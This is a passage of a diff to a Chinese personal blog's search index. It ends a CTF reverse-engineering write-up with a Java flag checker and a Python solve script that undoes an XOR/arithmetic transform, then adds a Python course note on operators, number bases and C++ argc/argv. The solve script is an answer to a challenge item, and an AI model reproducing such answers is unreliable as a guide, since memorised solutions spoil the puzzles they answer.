&#123;</span><br><span class="line">         <span class="keyword">if</span> (validate(<span class="keyword">new</span> <span class="title class_">String</span>(var3), var2)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Correct&quot;</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">1102</span>, <span class="number">1067</span>, <span class="number">1032</span>, <span class="number">1562</span>, <span class="number">1612</span>, <span class="number">1257</span>, <span class="number">1562</span>, <span class="number">1067</span>, <span class="number">1012</span>, <span class="number">902</span>, <span class="number">882</span>, <span class="number">1397</span>, <span class="number">1472</span>, <span class="number">1312</span>, <span class="number">1442</span>, <span class="number">1582</span>, <span class="number">1067</span>, <span class="number">1263</span>, <span class="number">1363</span>, <span class="number">1413</span>, <span class="number">1379</span>, <span class="number">1311</span>, <span class="number">1187</span>, <span class="number">1285</span>, <span class="number">1217</span>, <span class="number">1313</span>, <span class="number">1297</span>, <span class="number">1431</span>, <span class="number">1137</span>, <span class="number">1273</span>, <span class="number">1161</span>, <span class="number">1339</span>, <span class="number">1267</span>, <span class="number">1427</span>]</span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&quot;oF/M5BK_U&lt;rqxCf8zWCPC(RK,/B&#x27;v3uARD&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    c[i] -= <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">c1 = [<span class="string">&#x27;&#x27;</span>] * <span class="number">34</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    c1[i * <span class="number">2</span> + <span class="number">1</span>] = <span class="built_in">int</span>(c[i] / <span class="number">5</span>)</span><br><span class="line">    c1[i * <span class="number">2</span>] = <span class="built_in">int</span>(c[i + <span class="number">17</span>] / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    c1[i] += key[<span class="number">33</span> - i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    c1[i] ^= key[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c1[i]), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
+        <tag>WP</tag>
+        <tag>Misc</tag>
+        <tag>Forensics</tag>
       </tags>
   </entry>
   <entry>
@@ -548,6 +497,100 @@
       <tags>
         <tag>Reverse</tag>
         <tag>C#</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023.3.7 第二次课</title>
+    <url>/2024/03/07/20240307/</url>
+    <content><![CDATA[<h1 id="执行-py-文件"><a href="#执行-py-文件" class="headerlink" title="执行 .py 文件"></a>执行 <code>.py</code> 文件</h1><p>在命令行中输入 <code>Python filename</code> 执行程序，<code>filename</code> 为待执行的代码。</p>
+<h2 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h2><p>cmd 的路径为 <code>C:\Windows\system32</code>，当且仅当待执行代码在当前文件夹下，可以使用相对路径，否则必须使用绝对路径。</p>
+<p>举一个例子，假设待执行代码为 program.py，位置在 <code>C:\Windows\system32\</code>，则可以直接输入 <code>python program.py</code> 执行代码；若位置在 <code>E:\program\</code> 下，则需要输入 <code>python E:\program\program.py</code> 执行代码。</p>
+<h1 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h1><p>在 Python 中，四则运算的优先级与数学中四则运算优先级相同，先算括号，其次是乘方，再次是乘除，最后是加减。</p>
+<h2 id="除与整除"><a href="#除与整除" class="headerlink" title="除与整除"></a>除与整除</h2><p><code>/</code> 为除，得到浮点型数据；<code>//</code> 为整除，得到整型数据。举例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span> / <span class="number">4</span></span><br><span class="line"><span class="number">1.75</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span> // <span class="number">4</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="乘方"><a href="#乘方" class="headerlink" title="乘方"></a>乘方</h2><p>Python 中使用 <code>**</code> 代表乘方：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span> ** <span class="number">2</span></span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>
+
+<p>同时，<code>**</code> 也可以用于计算开根：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span> ** <span class="number">0.5</span></span><br><span class="line"><span class="number">2.23606797749979</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，我们还可以用 Python 自带的 <code>math</code> 模块的 <code>sqrt()</code> 方法计算二次方根。导入模块的方法为 <code>import module</code>，<code>module</code> 为待导入的模块，<code>help(module)</code> 可以查看某个模块中可用的类、方法、常量。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.<span class="built_in">pow</span>(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">25.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sqrt(<span class="number">5</span>)</span><br><span class="line"><span class="number">2.23606797749979</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="主函数传递参数"><a href="#主函数传递参数" class="headerlink" title="主函数传递参数"></a>主函数传递参数</h1><p>之前研究过 C&#x2F;C++ 中的 <code>main()</code> 函数参数传递，直接粘过来：</p>
+<p>What is <code>int main(int argc, char **argv, char **enpv)</code> ?</p>
+<h2 id="argc"><a href="#argc" class="headerlink" title="argc"></a>argc</h2><p><code>argc</code> 为整型数据，存储命令行参数的个数。</p>
+<h2 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h2><p><code>argv</code> 为“指向指针的指针”，即字符串数组，用于存储命令行参数。该参数亦可写作 <code>*argv[]</code>。argc的值即为<code>argv</code>元素的数量。<code>argv[0]</code> 存储的是当前程序的位置。</p>
+<h2 id="envp"><a href="#envp" class="headerlink" title="envp"></a>envp</h2><p><code>envp</code> 的类型也是“指向指针的指针”，存放当前程序运行环境的参数.</p>
+<p>我们不妨运行下面的代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; argc &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; envp[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后我们能得到下面的结果</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">E:\Documents\Test Programs\Test\Debug\Test.exe</span><br><span class="line">ADSK_3DSMAX_x64</span><br></pre></td></tr></table></figure>
+
+<p>前面提到，<code>argv</code> 用于存储命令行参数，如果我们在运行程序时添加一些参数，就能改变argc与argv的值。</p>
+<p>我们不妨修改一下代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; argc &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; argv[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后在同一文件夹下创建 Test.txt，在命令行中运行命令 <code>start Test.exe Test.txt</code>，可以看到程序的输出如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">Test.exe</span><br><span class="line">Test.txt</span><br></pre></td></tr></table></figure>
+
+<p>在 Python 中，向程序传递的参数存储在 <code>sys.argv</code> 中，需要提前导入 <code>sys</code> 模块；在 Java 中是 <code>String[] args</code></p>
+<h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><p>Python 支持二进制、八进制、十进制、十六进制。如无特殊说明，则默认使用十进制。</p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">标识</th>
+<th align="center">转换方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">二进制</td>
+<td align="center"><code>0b</code></td>
+<td align="center"><code>bin()</code></td>
+</tr>
+<tr>
+<td align="center">八进制</td>
+<td align="center"><code>0o</code></td>
+<td align="center"><code>oct()</code></td>
+</tr>
+<tr>
+<td align="center">十进制</td>
+<td align="center">无</td>
+<td align="center"><code>int()</code></td>
+</tr>
+<tr>
+<td align="center">十六进制</td>
+<td align="center"><code>0x</code></td>
+<td align="center"><code>hex()</code></td>
+</tr>
+</tbody></table>
+<p>举例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="number">0b1101</span>)  <span class="comment"># 将二进制 1101 转化为十进制</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0o1453</span>)  <span class="comment"># 将八进制 1453 转化为十六进制</span></span><br><span class="line"><span class="string">&#x27;0x32b&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="小整数池"><a href="#小整数池" class="headerlink" title="小整数池"></a>小整数池</h1><p>见文章 <a href="https://jackgdn.github.io/2024/03/07/Python-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#%E5%B0%8F%E6%95%B4%E6%95%B0%E6%B1%A0">Python 内存相关学习记录 - 小整数池</a></p>
+<h1 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h1><p>操作符分为单目操作符、双目操作符与三目操作符，即用于标识操作符前后的操作数个数。例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">not</span> <span class="literal">True</span>  <span class="comment"># not 是弹幕操作符</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> + <span class="number">2</span>  <span class="comment"># + 是双目操作符</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="除余操作（模运算）"><a href="#除余操作（模运算）" class="headerlink" title="除余操作（模运算）"></a>除余操作（模运算）</h2><p><code>%</code> 是一个双目操作数，用于取余数。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> % <span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><em>在 Python 中，浮点类型数据也可以做模运算，不过意义不大。</em></p>
+<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符又三个 <code>and</code> <code>or</code> <code>not</code>，运算结果为布尔型。<code>and</code> <code>or</code> 的优先级低于数学运算符。</p>
+<h1 id="Python-变量命名规则"><a href="#Python-变量命名规则" class="headerlink" title="Python 变量命名规则"></a>Python 变量命名规则</h1><ul>
+<li>可以使用字母或下划线开头，不能使用数字开头</li>
+<li>仅数字、字母与下划线可以出现在变量名中</li>
+<li>Python 关键字不可用于变量名</li>
+</ul>
+<p><strong>注意：虽然一些有特殊含义与用途的单词允许被用作变量名（例如 <code>str</code> <code>int</code>），但这样做会引发歧义，因此不建议这样命名变量！</strong></p>
+]]></content>
+      <categories>
+        <category>Python 编程导论笔记</category>
+      </categories>
+      <tags>
+        <tag>Python 编程导论笔记</tag>
       </tags>
   </entry>
 </search>
